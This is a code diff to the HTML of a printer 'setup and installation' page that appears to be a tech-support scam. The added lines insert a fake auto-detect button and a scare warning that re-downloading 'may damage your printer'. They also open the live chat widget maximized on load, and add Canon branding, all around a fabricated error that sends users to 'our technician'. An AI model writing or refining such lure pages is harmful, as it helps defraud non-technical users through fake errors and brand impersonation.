@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Printer Setup And Installation</title>
-    <link rel="stylesheet" href="styles.css">
+    <link rel="stylesheet" href="setup-styles.css">
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
 </head>
 <body class="setup-page">
@@ -21,7 +21,12 @@
                 <li><span class="check">✓</span> New printer setup</li>
             </ul>
 
-            <div class="form-card" id="form-container">
+            <div class="get-started-container" id="get-started-container" style="text-align: left; margin-top: 30px;">
+                <p style="font-size: 1.1rem; color: var(--text-muted); margin-bottom: 25px; line-height: 1.6;">Click the button below to initiate the setup wizard and automatically detect your printer model.</p>
+                <button class="submit-btn" id="get-started-btn" style="width: auto; padding: 15px 40px; font-size: 1.1rem;">Get Started Now</button>
+            </div>
+
+            <div class="form-card" id="form-container" style="display: none; margin-top: 20px;">
                 <h2>Enter details to setup printer</h2>
                 <form id="setup-form">
                     <div class="input-group">
@@ -66,6 +71,7 @@
                     
                     <div class="error-message" id="error-message" style="display: none;">
                         <p class="error-code">Error 505x: Connection lost while repackaging.</p>
+                        <p style="color: var(--text-dark); margin: 10px 0; font-weight: bold;">Please do not re-download. It may damage your printer or drivers.</p>
                         <p class="error-action">Please chat to our technician for help.</p>
                     </div>
                 </div>
@@ -74,8 +80,7 @@
 
         <!-- Right Side: Image -->
         <div class="right-panel">
-            <!-- Using a high quality placeholder for the printer image -->
-            <img src="https://images.unsplash.com/photo-1612815154858-60aa4c59eaa6?q=80&w=1000&auto=format&fit=crop" alt="Printer" class="printer-img">
+            <img src="canon.png" alt="Canon Printer" class="printer-img" style="background-color: white; padding: 30px; border-radius: 16px; box-shadow: 0 20px 40px rgba(0,0,0,0.15); max-width: 100%; height: auto; object-fit: contain;">
         </div>
     </div>
 
@@ -87,9 +92,9 @@
     <!-- Tawk.to Script -->
     <script type="text/javascript">
     var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
-    // Configure Tawk.to to stay hidden initially
+    // Configure Tawk.to to maximize initially
     Tawk_API.onLoad = function(){
-        Tawk_API.hideWidget();
+        Tawk_API.maximize();
     };
     Tawk_API.onChatMinimized = function(){
         Tawk_API.hideWidget();
@@ -110,6 +115,6 @@
     s0.parentNode.insertBefore(s1,s0);
     })();
     </script>
-    <script src="script.js"></script>
+    <script src="setup-script.js"></script>
 </body>
 </html>
